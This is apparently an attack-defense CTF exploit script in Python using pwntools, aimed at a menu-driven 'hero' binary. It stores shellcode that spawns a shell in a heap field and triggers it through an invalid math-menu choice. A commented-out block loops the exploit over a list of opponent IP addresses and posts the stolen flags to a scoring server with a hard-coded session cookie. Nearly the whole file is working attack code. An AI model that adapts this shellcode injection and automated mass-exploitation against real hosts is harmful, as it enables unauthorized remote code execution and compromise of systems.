from pwn import *
import requests
context.log_level='debug'
context(arch='amd64')
TIMEOUT=3
timeout=3
def submit(flag):
	# send post requests
	cookie = {"JSESSIONID": "789AB54F27EEE1E50A01235D1A1F96EE"}
	header = {"Referer": "http://172.91.1.12:9090/arace/index"}
	s = requests.session()
	r = s.post("http://172.91.1.12:9090/ad/hacker/submit/submitCode", data={"flag": flag}, cookies=cookie, headers=header)
	return r.text
debug = 1
def pwn(ip='127.0.0.1'):
	if debug:
		p = process('./hero')
	else:
		p = remote(ip,8089,timeout=TIMEOUT)	
	def add(name,power):
		p.sendlineafter("Your choice: ",'1',timeout=timeout)
		p.sendafter("What's your hero's name:\n",name,timeout=timeout)
		p.sendafter("What's your hero's power:\n",power,timeout=timeout)

	def show(idx):
		p.sendlineafter("Your choice: ",'2',timeout=timeout)
		p.sendlineafter("What hero do you want to show?\n",str(idx),timeout)

	def edit(idx,name,power):
		p.sendlineafter("Your choice: ",'3',timeout=timeout)
		p.sendlineafter("What hero do you want to edit?\n",str(idx),timeout)
		p.sendafter("What's your hero's name:\n",name,timeout=timeout)
		p.sendafter("What's your hero's power:\n",power,timeout)

	def remove(idx):
		p.sendlineafter("Your choice: ",'4',timeout=timeout)
		p.sendlineafter("What hero do you want to remove?\n",str(idx),timeout=timeout)

	def math(choice,a,b):
		p.sendlineafter("Your choice: ",'6',timeout=timeout)
		p.sendlineafter("4. Divide two numbers\n",str(choice),timeout=timeout)
		p.sendlineafter("Please input two numbers to do math with\n",str(a)+" "+str(b),timeout=timeout)
	name_addr = 0x602160
	power_addr = 0x602100

	payload = asm(shellcraft.sh())
	add('000\n',payload)

	#gdb.attach(p,'b *0x400a6e')
	math(13,1,2)
	'''
	p.sendline("cat flag")
	flag = p.recvline(timeout=timeout)
	print flag
	return flag.replace('\n','')
	'''
	
	p.interactive()
pwn()
'''	
ips = [ '172.91.0.112',  '172.91.0.122','172.91.0.138', '172.91.0.144',  '172.91.0.33','172.91.0.42',  '172.91.0.45', '172.91.0.47 ',   '172.91.0.59', '172.91.0.61', '172.91.0.62',   '172.91.0.69', '172.91.0.70',   '172.91.0.87',   '172.91.0.93', '172.91.0.94', '172.91.0.97']
goodlist=['172.91.0.125','172.91.0.88','172.91.0.54','172.91.0.104','172.91.0.53','172.91.0.91','172.91.0.116', '172.91.0.34','172.91.0.82', '172.91.0.78','172.91.0.68','172.91.0.101','172.91.0.35','172.91.0.64','172.91.0.138','172.91.0.115']
real_ban=['172.91.0.44','172.91.0.18','172.91.0.99','172.91.0.51','172.91.0.92','172.91.0.60','172.91.0.106','172.91.0.35']
for ip in ips:

	try:
		flag = pwn(ip)
		
		if flag:
			print submit(flag)
	except:
		pass

'''



